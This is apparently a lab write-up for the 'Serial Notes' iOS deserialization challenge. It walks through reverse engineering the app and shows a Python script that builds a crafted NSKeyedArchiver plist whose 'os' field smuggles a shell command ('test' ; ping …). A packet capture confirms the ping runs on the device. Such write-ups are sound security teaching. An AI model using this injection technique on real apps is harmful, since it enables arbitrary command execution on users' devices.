**Description**: Welcome to the **iOS Application Security Lab: Deserialization Vulnerability Challenge**. The challenge revolves around a fictitious note-taking app called Serial Notes. Serial Notes is designed to support markdown editing and has its own file format to share the notes. However, it harbors a critical vulnerability related to deserialization, which can be escalated to command injection. Your objective is to exploit this vulnerability to execute arbitrary command within the app.

**Download**: https://lautarovculic.com/my_files/serialNotes.ipa
**Link:** https://www.mobilehackinglab.com/path-player?courseid=lab-serial-notes

![[serialNotes1.png]]

Install an **IPA** file can be difficult.
So, for make it more easy, I made a YouTube video with the process using **Sideloadly**.
**LINK**: https://www.youtube.com/watch?v=YPpo9owRKGE

**NOTE**: If you have problems with the keyboard and UI (buttons) when you need to hide it on a physical device, you can fix this problem by using the `KeyboardTools` by `@CrazyMind90` found in the Sileo app store.

Once you have the app installed, let's proceed with the challenge.
We can see that is a simple text editor that use markdown for **show the notes**.
This have functionalities like '`save`', `create` and **`open`**.

**unzip** the **`.ipa`** file.
Looking inside of `SerialNotes.app` folder, let's inspect the **`Info.plsit`**, but here doesn't have interesting information.
Also, another folder can be inspected, **`/Frameworks/hermes.framework`**
We have another **`Info.plist`**
```XML
<dict>
	<key>CFBundleDevelopmentRegion</key>
	<string>English</string>
	<key>CFBundleExecutable</key>
	<string>hermes</string>
	<key>CFBundleIconFile</key>
	<string></string>
	<key>CFBundleIdentifier</key>
	<string>dev.hermesengine.iphoneos</string>
	<key>CFBundleInfoDictionaryVersion</key>
	<string>6.0</string>
	<key>CFBundlePackageType</key>
	<string>FMWK</string>
	<key>CFBundleShortVersionString</key>
	<string>0.12.0</string>
	<key>CFBundleSignature</key>
	<string>????</string>
	<key>CFBundleVersion</key>
	<string>0.12.0</string>
	<key>CSResourcesFileMapped</key>
	<true/>
	<key>MinimumOSVersion</key>
	<string>13.4</string>
</dict>
```

We can see that use
- **Hermes 0.12.0**
*I did't find any CVE or vulnerabilities that we can approach.*

But I found this interesting article:
https://snyk.io/blog/swift-deserialization-security-primer/

We can confirm with
```bash
strings "SerialNotes" | grep -iE "NScoding|NSSecureCoding|initWithCoder:|encodeWithCoder:"
```

Output:
```bash
NSCoding
encodeWithCoder:
initWithCoder:
```

Now it's time for **objection** tool.
With your phone connected, and SerialNotes app opened, run
```bash
objection -g "SerialNotes" explore
```
With `env` command we can see the the environment where the app works.
```bash
Name               Path
-----------------  -----------------------------------------------------------------------------------------------
BundlePath         /private/var/containers/Bundle/Application/50CB8C88-5438-4C17-B214-E8B949E0C8B5/SerialNotes.app
CachesDirectory    /var/mobile/Containers/Data/Application/4A04863D-50E3-4DDB-BBFF-A9099D004079/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/4A04863D-50E3-4DDB-BBFF-A9099D004079/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/4A04863D-50E3-4DDB-BBFF-A9099D004079/Library
```

Save a file demo `notes.serial` and get the file with **scp**
```bash
scp root@192.168.1.90:/private/var/mobile/Containers/Shared/AppGroup/<YOURAPPFILEMANAGERUUID>/File\ Provider\ Storage/notes.serial .
```

Then
```bash
file notes.serial

notes.serial: Apple binary property list
```

So, let's convert this file in a readable format.
```bash
plutil -convert xml1 notes.serial -o notes_serial.xml
```

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>$archiver</key>
        <string>NSKeyedArchiver</string>
        <key>$objects</key>
        <array>
            <string>$null</string>
            <dict>
                <key>$class</key>
                <dict>
                    <key>CF$UID</key>
                    <integer>8</integer>
                </dict>
                <key>NS.objects</key>
                <array>
                    <dict>
                        <key>CF$UID</key>
                        <integer>2</integer>
                    </dict>
                </array>
            </dict>
            <dict>
                <key>$class</key>
                <dict>
                    <key>CF$UID</key>
                    <integer>7</integer>
                </dict>
                <key>content</key>
                <dict>
                    <key>CF$UID</key>
                    <integer>4</integer>
                </dict>
                <key>last_updated</key>
                <dict>
                    <key>CF$UID</key>
                    <integer>5</integer>
                </dict>
                <key>name</key>
                <dict>
                    <key>CF$UID</key>
                    <integer>3</integer>
                </dict>
                <key>os</key>
                <dict>
                    <key>CF$UID</key>
                    <integer>6</integer>
                </dict>
            </dict>
            <string>Untitled</string>
            <string>Test</string>
            <string>Sun, 16 Feb 2025 18:48:36 GMT</string>
            <string>Darwin iPhoneHack 22.6.0 Darwin Kernel Version 22.6.0: Tue Jul  2 20:47:35 PDT 2024; root:xnu-8796.142.1.703.8~1/RELEASE_ARM64_T8015 iPhone10,3 arm Darwin</string>
            <dict>
                <key>$classes</key>
                <array>
                    <string>SerialNotes.Note</string>
                    <string>NSObject</string>
                </array>
                <key>$classname</key>
                <string>SerialNotes.Note</string>
            </dict>
            <dict>
                <key>$classes</key>
                <array>
                    <string>NSArray</string>
                    <string>NSObject</string>
                </array>
                <key>$classname</key>
                <string>NSArray</string>
            </dict>
        </array>
        <key>$top</key>
        <dict>
            <key>root</key>
            <dict>
                <key>CF$UID</key>
                <integer>1</integer>
            </dict>
        </dict>
        <key>$version</key>
        <integer>100000</integer>
    </dict>
</plist>
```

The structure includes classes like `SerialNotes.Note` and `NSArray`, indicating that this plist may be used to store serialized data for notes or similar objects.

Let's use **ghidra** for **functions** analysis.
After use some **frida scripts** I noticed that the we have a deserialization when we try open some file.
The functions is so huge, but it's `String __thiscall SerialNotes::SerialFile::$openFile(SerialFile *this,String param_1)`

Where we can found that some command is executed, and uses
```CPP
__C::NSKeyedUnarchiver::typeMetadataAccessor();
(extension_Foundation)::__C::NSKeyedUnarchiver::$unarchiveTopLevelObjectWithData(DVar11);
```
That means that we can inject an **`bplist`** object for modify what reproduce deserialization.
In `notes_serial.xml`, we see that each note is stored with this structure:
```XML
<dict>
	<key>$classes</key>
	<array>
		<string>SerialNotes.Note</string>
		<string>NSObject</string>
	</array>
	<key>$classname</key>
	<string>SerialNotes.Note</string>
</dict>
```
This means that we must modify the `SerialNotes.Note` class to **inject our payload**.

`openFile` and `executeCommand` are **manipulating string data**.
We can found
```CPP
Swift::String::append(SVar32, SVar36);
SVar35.str = (char *)"uname -s";
Swift::String::append(SVar31, SVar35);
```
This confirms that strings are **being concatenated before executing a command**.
```bash
strings "SerialNotes" | grep "uname"
```
Output:
```bash
uname -a
uname -a  | grep -o '
```
If we **manage to inject a malicious value in content or name inside `SerialNotes.Note`**, we can alter the execution, for example `lautaro' ; <command>`

Then, we can create the malicious `.serial` file with this python script
```python
import plistlib

payload = {
    "$archiver": "NSKeyedArchiver",
    "$version": 100000,
    "$objects": [
        "$null",
        {
            "$class": {"CF$UID": 8},
            "NS.objects": [{"CF$UID": 2}]
        },
        {
            "$class": {"CF$UID": 7},
            "content": {"CF$UID": 4},  
            "last_updated": {"CF$UID": 5},
            "name": {"CF$UID": 3},
            "os": {"CF$UID": 6} # Inject command
        },
        "Title",
        "exploit_note",
        "Sun, 16 Feb 2025 18:48:36 GMT",
        "test' ; ping 192.168.1.75 #", # Command
        {
            "$classes": ["SerialNotes.Note", "NSObject"],
            "$classname": "SerialNotes.Note"
        },
        {
            "$classes": ["NSArray", "NSObject"],
            "$classname": "NSArray"
        }
    ],
    "$top": {
        "root": {"CF$UID": 1}
    }
}

with open("command_injection.serial", "wb") as f:
    f.write(plistlib.dumps(payload))

print("File generated: command_injection.serial")
```
**Note: `192.168.1.75` is my machine attacker IP & my iPhone is `192.168.1.90`**

We get `command_injection.serial` file. Which can be upload via **scp** or with a *python server*.

Once you upload the file, *restart the app* and then, **open the file**.
In this case, I can see how the `ping` command is **executed**
```bash
21:18:17.825519 IP 192.168.1.90 > 192.168.1.75: ICMP echo request, id 3664, seq 1, length 64
21:18:17.825663 IP 192.168.1.75 > 192.168.1.90: ICMP echo reply, id 3664, seq 1, length 64
21:18:18.591430 IP 192.168.1.1 > 192.168.1.75: ICMP echo request, id 1, seq 0, length 64
21:18:18.591490 IP 192.168.1.75 > 192.168.1.1: ICMP echo reply, id 1, seq 0, length 64
21:18:18.593379 IP 192.168.1.1 > 192.168.1.75: ICMP echo request, id 1, seq 256, length 64
21:18:18.593438 IP 192.168.1.75 > 192.168.1.1: ICMP echo reply, id 1, seq 256, length 64
21:18:18.827168 IP 192.168.1.90 > 192.168.1.75: ICMP echo request, id 3664, seq 2, length 64
21:18:18.827325 IP 192.168.1.75 > 192.168.1.90: ICMP echo reply, id 3664, seq 2, length 64
21:18:19.834521 IP 192.168.1.90 > 192.168.1.75: ICMP echo request, id 3664, seq 3, length 64
21:18:19.834711 IP 192.168.1.75 > 192.168.1.90: ICMP echo reply, id 3664, seq 3, length 64
21:18:20.873526 IP 192.168.1.90 > 192.168.1.75: ICMP echo request, id 3664, seq 4, length 64
21:18:20.873739 IP 192.168.1.75 > 192.168.1.90: ICMP echo reply, id 3664, seq 4, length 64
21:18:21.837882 IP 192.168.1.90 > 192.168.1.75: ICMP echo request, id 3664, seq 5, length 64
21:18:21.838062 IP 192.168.1.75 > 192.168.1.90: ICMP echo reply, id 3664, seq 5, length 64
21:18:22.909991 IP 192.168.1.90 > 192.168.1.75: ICMP echo request, id 3664, seq 6, length 64
21:18:22.910140 IP 192.168.1.75 > 192.168.1.90: ICMP echo reply, id 3664, seq 6, length 64
```

I hope you found it useful (: